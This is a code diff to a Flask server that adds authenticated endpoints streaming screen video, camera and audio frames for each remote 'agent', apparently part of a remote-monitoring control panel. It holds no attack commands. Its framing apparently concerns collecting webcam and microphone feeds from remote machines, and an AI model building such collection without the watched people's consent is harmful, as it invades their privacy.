@@ -2687,11 +2687,70 @@ AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 # Frame timing for real-time monitoring
 FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS
 
-# Legacy HTTP POST endpoints removed - now using socket.io binary streaming
+# HTTP streaming endpoints for browser compatibility
+@app.route('/video_feed/<agent_id>')
+@require_auth
+def video_feed(agent_id):
+    """Stream video feed for a specific agent"""
+    def generate_video():
+        while True:
+            if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
+                frame = VIDEO_FRAMES_H264[agent_id]
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+            else:
+                # Send empty frame if no data available
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + b'\r\n')
+            time.sleep(0.5)  # 2 FPS
+    
+    return Response(generate_video(),
+                    mimetype='multipart/x-mixed-replace; boundary=frame',
+                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
+                            'Pragma': 'no-cache',
+                            'Expires': '0'})
 
-# Legacy camera HTTP POST endpoints removed - now using socket.io binary streaming
+@app.route('/camera_feed/<agent_id>')
+@require_auth
+def camera_feed(agent_id):
+    """Stream camera feed for a specific agent"""
+    def generate_camera():
+        while True:
+            if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
+                frame = CAMERA_FRAMES_H264[agent_id]
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+            else:
+                # Send empty frame if no data available
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + b'\r\n')
+            time.sleep(0.5)  # 2 FPS
+    
+    return Response(generate_camera(),
+                    mimetype='multipart/x-mixed-replace; boundary=frame',
+                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
+                            'Pragma': 'no-cache',
+                            'Expires': '0'})
 
-# Legacy audio HTTP POST endpoints removed - now using socket.io binary streaming
+@app.route('/audio_feed/<agent_id>')
+@require_auth
+def audio_feed(agent_id):
+    """Stream audio feed for a specific agent"""
+    def generate_audio():
+        while True:
+            if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
+                frame = AUDIO_FRAMES_OPUS[agent_id]
+                yield frame
+            else:
+                # Send silence if no data available
+                yield b'\x00' * 1024
+            time.sleep(0.1)  # 10 FPS for audio
+    
+    return Response(generate_audio(),
+                    mimetype='audio/wav',
+                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
+                            'Pragma': 'no-cache',
+                            'Expires': '0'})
 
 # --- Socket.IO Event Handlers ---
 
